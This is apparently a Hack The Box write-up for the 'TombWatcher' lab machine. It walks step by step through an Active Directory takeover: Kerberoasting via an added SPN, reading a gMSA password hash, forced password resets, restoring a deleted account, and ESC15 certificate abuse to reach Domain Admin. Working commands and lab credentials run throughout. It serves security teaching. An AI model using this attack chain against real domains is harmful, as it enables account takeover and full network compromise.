---
title: "TombWatcher"
date: 2025-08-29
categories: [HTB]
tags: [machine, ADCS, CVE,AD]
---
![TombWatcher](/assets/3.png)

## Machine Information
As is common in real life Windows pentests, you will start the TombWatcher box with credentials for the following account: ```henry / H3nry_987TGV!```

# $User_flag
## Nmap Scan

```shell
sudo nmap -Pn -T4 -A -open -p- -sC -sV -oA nmap.txt 10.10.11.72
```
```shell 
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-06 17:30:17Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
|_ssl-date: 2025-08-06T17:31:55+00:00; +4h00m01s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-08-06T17:31:54+00:00; +4h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
|_ssl-date: 2025-08-06T17:31:55+00:00; +4h00m01s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
|_ssl-date: 2025-08-06T17:31:54+00:00; +4h00m00s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49681/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49683/tcp open  msrpc         Microsoft Windows RPC
49684/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
49717/tcp open  msrpc         Microsoft Windows RPC
49732/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-08-06T17:31:15
|_  start_date: N/A
|_clock-skew: mean: 4h00m00s, deviation: 0s, median: 3h59m59s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   166.59 ms 10.10.16.1
2   166.87 ms 10.10.11.72
```
After some digging around and some tries with many ports , I realized BloodHound is the key to solving this box i loading BloodHound, the attack path from Henry was clear just everything was ready to hacked.
start with ```Shortest Paths to High Value Targets```
![bloodhound1](https://mrci0x1.gitbook.io/home/~gitbook/image?url=https%3A%2F%2F2226553737-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FGuulzzy1AvWrJMh0trBB%252Fuploads%252FsJzRIss1HHwv5kGYbcUQ%252Fimage.png%3Falt%3Dmedia%26token%3Dd09f70ee-8cae-452e-b91d-63828bf87feb&width=400&dpr=3&quality=100&sign=c7f90cc0&sv=2)
The attack path was clear every user and group along the chain had the right privileges to reach the target.

## Bloodhound 0x1

Started recon with BloodHound to enumerate all AD objects:
```shell
bloodhound-python -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' -gc tomb-dc.tombwatcher.htb -ns 10.10.11.72 -c all --zip
```
This collects all information (users, groups, sessions, ACLs, etc.) and saves it in a zip file to analyze in the BloodHound GUI.
![bloodhound2](https://mrci0x1.gitbook.io/home/~gitbook/image?url=https%3A%2F%2F2226553737-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FGuulzzy1AvWrJMh0trBB%252Fuploads%252FbkHQIbJq7ukNCmquA8NA%252Fimage.png%3Falt%3Dmedia%26token%3D2bae0a56-9510-42d2-aa1a-c5c38b266280&width=400&dpr=3&quality=100&sign=3214ac65&sv=2)
I found the  that ```HENRY``` has write access to the ```servicePrincipalName``` of ```ALFRED```, which can be abused for Kerberoasting write permissions

## Abuse SPN via LDAP Write Permissions

- Create the ```.ldif``` file to add a fake SPN
```shell
dn: CN=ALFRED,CN=Users,DC=tombwatcher,DC=htb
changetype: modify
add: servicePrincipalName
servicePrincipalName: fake/alfsvc
```
- Add a fake SPN to ```ALFRED``` via LDAP.
```shell
ldapmodify -x -H ldap://10.10.11.72 -D "CN=HENRY,CN=Users,DC=tombwatcher,DC=htb" -w 'H3nry_987TGV!' -f add_spn.ldif
```
- Request a TGS ticket for that SPN.
```shell
impacket-GetUserSPNs tombwatcher.htb/HENRY:'H3nry_987TGV!' -dc-ip 10.10.11.72 -request
```
- Crack the TGS offline using hashcat or john to get ALFRED's password.
```shell 
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```
![offline](https://mrci0x1.gitbook.io/home/~gitbook/image?url=https%3A%2F%2F2226553737-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FGuulzzy1AvWrJMh0trBB%252Fuploads%252FAWXRFg3xAlG2DFosYFvL%252Fimage.png%3Falt%3Dmedia%26token%3D1e3aba3d-dd76-44d9-9eae-5fd88f3bdf85&width=400&dpr=3&quality=100&sign=5010c521&sv=2)
Once cracked, we got access to ```ALFRED```, moving one step closer to full domain compromise and continue with ```alfred``` crednetials 

> We run BloodHound again after each new user because it updates our attack paths based on the new permissions and group memberships revealing new ways to escalate.
{: .prompt-info }

## Bloodhound 0x2

Using Alfred’s credentials, we ran BloodHound again to uncover new attack paths from his perspective.
```shell 
bloodhound-python -d tombwatcher.htb -u alfred -p 'basketball' -gc tomb-dc.tombwatcher.htb -ns 10.10.11.72 -c all --zip
```
![bloodhound3](https://mrci0x1.gitbook.io/home/~gitbook/image?url=https%3A%2F%2F2226553737-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FGuulzzy1AvWrJMh0trBB%252Fuploads%252Fp4tuYgaMxZp5KDAKrrPO%252Fimage.png%3Falt%3Dmedia%26token%3De761548b-c9f7-4307-b008-616f4f01d423&width=400&dpr=3&quality=100&sign=6a50f1e9&sv=2)
From Alfred’s account, we had permission to add users to the INFRASTRUCTURE group.
We used BloodyAD to add my Alfred to it:
```shell 
bloodyAD --host '10.10.11.72' -d 'dc01.TOMBWATCHER.HTB' -u 'alfred' -p 'basketball'  add groupMember 'INFRASTRUCTURE' alfred

[+] alfred added to INFRASTRUCTURE
```
This gave us the next step in our escacdlation path.

> Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great) It means your machine's clock is out of sync with the domain controller and Kerberos hates that. Fix it with:
{: .prompt-warning }
```shell 
sudo systemctl stop systemd-timesyncd
sudo ntpdate 10.10.11.72
```
This stops the system time service and manually syncs your clock with the DC ```(10.10.11.72)```, so you can get Kerberos tickets properly again.

## ReadGMSAPassword on ANSIBLE_DEV$

After joining the ```INFRASTRUCTURE``` group, we gained the ```ReadGMSAPassword``` privilege on the Group Managed Service Account ```ANSIBLE_DEV$@TOMBWATCHER.HTB```
![bloodhound4](https://mrci0x1.gitbook.io/home/~gitbook/image?url=https%3A%2F%2F2226553737-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FGuulzzy1AvWrJMh0trBB%252Fuploads%252Fp4tuYgaMxZp5KDAKrrPO%252Fimage.png%3Falt%3Dmedia%26token%3De761548b-c9f7-4307-b008-616f4f01d423&width=400&dpr=3&quality=100&sign=6a50f1e9&sv=2)
```shell 
ldeep ldap -d "dc01.tombwatcher.htb" -u "alfred" -p "basketball" -s ldaps://10.10.11.72 gmsa
```
![ldeep](https://mrci0x1.gitbook.io/home/~gitbook/image?url=https%3A%2F%2F2226553737-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FGuulzzy1AvWrJMh0trBB%252Fuploads%252F7jHbXvSVJifMNHkQetEC%252Fimage.png%3Falt%3Dmedia%26token%3D0176329c-57a0-41aa-a5ca-e3c5aab1a57a&width=400&dpr=3&quality=100&sign=937bbd22&sv=2)
We obtained the NTLM hash of the ```ansible_dev$``` machine account, allowing us to proceed with the next step in our path attack.

## Bloodhound 0x3

again and again and agian ...that is time with ```ansible_dev```      
```shell 
bloodhound-python -u 'ansible_dev$'  --hashes ':7bc5a56af89da4d3c03bc048055350f2' -d tombwatcher.htb -ns 10.10.11.72 -c All --zip
```
![bloodhound5](https://mrci0x1.gitbook.io/home/~gitbook/image?url=https%3A%2F%2F2226553737-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FGuulzzy1AvWrJMh0trBB%252Fuploads%252F4oQQgomkZfel7E5yf68x%252Fimage.png%3Falt%3Dmedia%26token%3D44d6c899-5cfc-463a-8910-49e0c1d9b24b&width=400&dpr=3&quality=100&sign=4365dca&sv=2)
We discovered that ```ANSIBLE_DEV$@TOMBWATCHER.HTB``` can reset SAM's password without needing the current one.

## ANSIBLE_DEV$ Change SAM's Password

```shell 
python3 ~/Downloads/impacket/examples/changepasswd.py -dc-ip 10.10.11.72 -altuser ansible_dev$ -althash :7bc5a56af89da4d3c03bc048055350f2 -reset 'tombwatcher.htb/SAM@10.10.11.72'
```
When prompted, we set a new password for SAM:
![set_password](https://mrci0x1.gitbook.io/home/~gitbook/image?url=https%3A%2F%2F2226553737-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FGuulzzy1AvWrJMh0trBB%252Fuploads%252FuoorifNMlP6u12XCplyV%252Fimage.png%3Falt%3Dmedia%26token%3D1572ea17-938f-4374-9de7-1d669ea5b4d6&width=400&dpr=3&quality=100&sign=577a795b&sv=2)
now we could change the sam user password.

## Bloodhound 0x4

This time with ```SAM```
```shell 
bloodhound-python -u 'sam'  -p 'sam_pass' -d tombwatcher.htb -ns 10.10.11.72 -c All --zip
```
![writeowner](https://mrci0x1.gitbook.io/home/~gitbook/image?url=https%3A%2F%2F2226553737-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FGuulzzy1AvWrJMh0trBB%252Fuploads%252Fmv69FDtj3sO9y8WtW8qO%252Fimage.png%3Falt%3Dmedia%26token%3De31852da-b0dd-4d02-8bb9-eaf4a323eb7a&width=400&dpr=3&quality=100&sign=6eb3e7c2&sv=2)

## SAM Can Take Over JOHN

The user ```SAM@TOMBWATCHER.HTB``` can change the owner of ```JOHN@TOMBWATCHER.HTB```.
```shell 
ldap_shell tombwatcher.htb/SAM:sam_pass -dc-ip 10.10.11.72

# set_owner "CN=john,CN=Users,DC=tombwatcher,DC=htb"
# set_genericall "CN=john,CN=Users,DC=tombwatcher,DC=htb" sam
# change_password john NewPassword123!
[INFO] Detected insecure connection, attempting to start StartTLS...
[INFO] StartTLS successfully activated!
[INFO] Password changed successfully for "john"! New password: "NewPassword123!"
```
we can take Control of JOHN and Requesting a TGT.
![tgt](https://mrci0x1.gitbook.io/home/~gitbook/image?url=https%3A%2F%2F2226553737-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FGuulzzy1AvWrJMh0trBB%252Fuploads%252F3X4Nd0AUILCXmxP6rFoW%252Fimage.png%3Falt%3Dmedia%26token%3Dfd0eb70d-2a24-49d3-9423-6448de5c41d1&width=400&dpr=3&quality=100&sign=5341fb&sv=2)
so what Next...

Now that we fully control ```JOHN@TOMBWATCHER.HTB```, we discovered he has the capability to create a PSRemote session with the Domain Controller ```DC01.TOMBWATCHER.HTB``` This allows us to Enter an interactive PowerShell session on the DC
![personate](https://mrci0x1.gitbook.io/home/~gitbook/image?url=https%3A%2F%2F2226553737-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FGuulzzy1AvWrJMh0trBB%252Fuploads%252FgdjcYxv9100DNHfmq8wG%252Fimage.png%3Falt%3Dmedia%26token%3Dc8dc0ffb-3b8f-42b7-a0b2-35e7a3966027&width=400&dpr=3&quality=100&sign=2fb24c47&sv=2)
```shell 
evil-winrm -i dc01.tombwatcher.htb -u john -p 'NewPassword123!'
```
![evil](https://mrci0x1.gitbook.io/home/~gitbook/image?url=https%3A%2F%2F2226553737-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FGuulzzy1AvWrJMh0trBB%252Fuploads%252Fun9kyFpO0dlJ7OHqhK6L%252Fimage.png%3Falt%3Dmedia%26token%3D3fbefa9e-d2ef-4d42-907f-0a153a514b21&width=400&dpr=3&quality=100&sign=26b4e148&sv=2)

# #Root_flag

Let’s check if John has anything leading to Administrator. We found AD CS, which is good, but not enough , so we’ll look for deleted or unusual user accounts to investigate further.
![root1](https://mrci0x1.gitbook.io/home/~gitbook/image?url=https%3A%2F%2F2226553737-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FGuulzzy1AvWrJMh0trBB%252Fuploads%252F2NSMhDlfyoQaQdlbPVSn%252Fimage.png%3Falt%3Dmedia%26token%3Da49e5264-1a29-4baf-a26e-f8f0146e98a4&width=400&dpr=3&quality=100&sign=1c33e57d&sv=2)
```shell 
 Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects -Properties *
```
![root2](https://mrci0x1.gitbook.io/home/~gitbook/image?url=https%3A%2F%2F2226553737-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FGuulzzy1AvWrJMh0trBB%252Fuploads%252FQhcD4AZ4Izr3w73PdFlU%252Fimage.png%3Falt%3Dmedia%26token%3Dce2b3d03-4d83-4db1-b3c4-355f35ffce8f&width=400&dpr=3&quality=100&sign=257d0a35&sv=2)
We found a deleted user, ```cert_admin``` perfect. Let’s restore the account and run BloodHound again to explore new attack paths.
```shell 
Restore-ADObject -Identity "CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb"
```
![root3](https://mrci0x1.gitbook.io/home/~gitbook/image?url=https%3A%2F%2F2226553737-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FGuulzzy1AvWrJMh0trBB%252Fuploads%252FsgwV7dzZYhoPRGQbGMhG%252Fimage.png%3Falt%3Dmedia%26token%3Dfc233a40-1bf6-430d-b0a7-bf77fc1972d6&width=400&dpr=3&quality=100&sign=ee608616&sv=2)
Now, we’ll use bloodyAD to remove the ```ACCOUNTDISABLE``` flag from ```cert_admin```, reactivating the account for use
```shell 
bloodyAD -d tombwatcher.htb -u john -p 'NewPassword123!' --host 10.10.11.72 remove uac cert_admin -f ACCOUNTDISABLE
```
we’ll use bloodyAD to set a new password  for ```cert_admin```, giving us direct access to the account.
```shell 
bloodyAD --host 10.10.11.72 -u john -p 'NewPassword123!' -d tombwatcher set password cert_admin HackTheBox
```
Let’s check if the ```cert_admin``` account exists and is active.
![root4](https://mrci0x1.gitbook.io/home/~gitbook/image?url=https%3A%2F%2F2226553737-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FGuulzzy1AvWrJMh0trBB%252Fuploads%252FRY6WpMXlfYTP5KlwkpXY%252Fimage.png%3Falt%3Dmedia%26token%3D3fffb592-864e-4b48-b0e7-f7759d5fcc16&width=400&dpr=3&quality=100&sign=6302e4da&sv=2)
Now, let’s check if there are any vulnerable certificate templates available for exploitation.
```shell 
certipy find -u 'cert_admin' -p 'HackTheBox' -dc-ip '10.10.11.72' -vulnerable -text -enabled
```
![root5](https://mrci0x1.gitbook.io/home/~gitbook/image?url=https%3A%2F%2F2226553737-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FGuulzzy1AvWrJMh0trBB%252Fuploads%252FeqL2W0lnVpV5FcegXBXK%252Fimage.png%3Falt%3Dmedia%26token%3Da758acfe-eed6-46aa-a40c-0c7e4b780c82&width=400&dpr=3&quality=100&sign=77e534f0&sv=2)
let's exploit it using ESC15

## ESC15: Vulnerable CT Abuse

Using the vulnerable ```WebServer``` certificate template, we requested a certificate for ```administrator@tombwatcher.htb```
```shell 
certipy req \
    -u 'cert_admin@tombwatcher.htb' -p 'HackTheBox' \
    -dc-ip '10.10.11.72' -target 'DC01.tombwatcher.htb' \
    -ca 'tombwatcher-CA-1' -template 'WebServer' \
    -upn 'administrator@tombwatcher.htb'  \
    -application-policies 'Client Authentication'
```
![root6](https://mrci0x1.gitbook.io/home/~gitbook/image?url=https%3A%2F%2F2226553737-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FGuulzzy1AvWrJMh0trBB%252Fuploads%252FzCXKmsVx6teCksdzzYdg%252Fimage.png%3Falt%3Dmedia%26token%3D8c07966f-cecb-426d-93a2-df353eca58ba&width=400&dpr=3&quality=100&sign=2f8fe164&sv=2)
authenticated with it, and reset the Administrator password .
```shell 
certipy auth -pfx 'administrator.pfx' -dc-ip '10.10.11.72' -ldap-shell
```
gaining full Domain Admin access.
![last](https://mrci0x1.gitbook.io/home/~gitbook/image?url=https%3A%2F%2F2226553737-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FGuulzzy1AvWrJMh0trBB%252Fuploads%252Fquvu2tHkOJrBhr31nLYA%252Fimage.png%3Falt%3Dmedia%26token%3D232899cb-5d11-4377-bdf8-da23e4917f6c&width=400&dpr=3&quality=100&sign=267900d5&sv=2)

### Thanks for Reading , see you in the next writup!!!
